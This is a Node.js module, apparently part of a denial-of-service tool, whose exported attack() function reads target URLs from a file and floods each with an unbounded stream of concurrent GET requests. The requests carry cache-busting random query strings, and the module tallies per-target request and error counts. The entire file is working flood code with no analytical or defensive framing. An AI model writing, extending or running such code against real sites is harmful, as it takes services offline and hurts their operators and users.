require('dotenv').config();

const fileHelper = require('../utils/fileHelper');
const settingsManager = require('../managers/settingsManager');
const {targetsPath} = require('../pathes');
const http = require("http");
const fetch = require('node-fetch');

const killSwitch = require('../killSwitch');

let targetStats = {};
let queue = [];

var State = true;

var counter = 0;

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    counter++;
    console.log(counter);

    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then(response => {
        clearTimeout(id);
        return response;
    }).catch(error => {
        clearTimeout(id);
        throw error;
    })
}

async function httpRequest(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    let opt = {
        host: 'google.com',
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal,
    };

    return http.request(opt, function(res)
    {
        res.setEncoding('utf8');
        res.on('data', function (chunk) {
            console.log("body: " + chunk);
        });
    });
}

async function flood(target) {
    try {
        for (let i = 0; State; ++i) {
            if (queue.length > Number(process.env.CONCURRENCY_LIMIT)) {
                await queue.shift();
            }

            const rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000);

            queue.push(
                fetchWithTimeout(target + rand, {timeout: Number(process.env.TIMEOUT)})
                    .catch(error => {
                        if (error.code === 20) {
                            return;
                        }

                        targetStats[target].number_of_errored_responses++;
                    })
                    .then(response => {
                        if (response && !response.ok) {
                            targetStats[target].number_of_errored_responses++;
                        }
                        targetStats[target].number_of_requests++;
                    })
            )
        }
    } catch (e) {
        throw e;
    }
}

//===============================================================================\\

function attack() {

    return new Promise((resolve, reject) => {

        State = true;

        let targets = fileHelper.readSync(targetsPath);

        try {
            targets.forEach(target => {
                targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
            });

            targets.map(flood);

        } catch (e) {
            console.log(e.message);
        }
    });
}


module.exports = {attack}
